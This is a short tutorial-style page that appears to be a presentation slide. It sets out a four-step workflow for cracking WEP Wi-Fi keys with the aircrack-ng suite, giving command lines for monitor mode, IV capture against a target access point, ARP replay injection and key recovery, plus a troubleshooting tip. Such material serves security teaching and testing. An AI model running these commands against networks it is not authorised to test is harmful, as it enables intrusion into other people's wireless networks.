Process Flow
WEP cracking workflow
1
Start monitor mode
Enable raw frame capture and note the monitor interface name. This is the foundation for all subsequent steps.
2
Capture IVs with airodump-ng
Focus on the target BSSID and channel, and save packets to a capture file for later analysis.
3
Stimulate traffic (ARP replay)
Re-inject captured ARP packets to force the AP to emit many IVs quickly.
4
Run aircrack-ng
When IVs are sufficient, run the cracker on the capture file to deduce the WEP key.
Command examples (visual)
sudo airmon-ng start wlan0
sudo airodump-ng --bssid <TARGET_AP_BSSID> -c <CHANNEL> -w wep_capture wlan0mon
sudo aireplay-ng --arpreplay -b <TARGET_AP_BSSID> -h <CLIENT_MAC> wlan0mon
sudo aircrack-ng wep_capture-01.cap
Check airodump-ng output for #Data growth. If it stalls, confirm injection success or authenticated client presence.
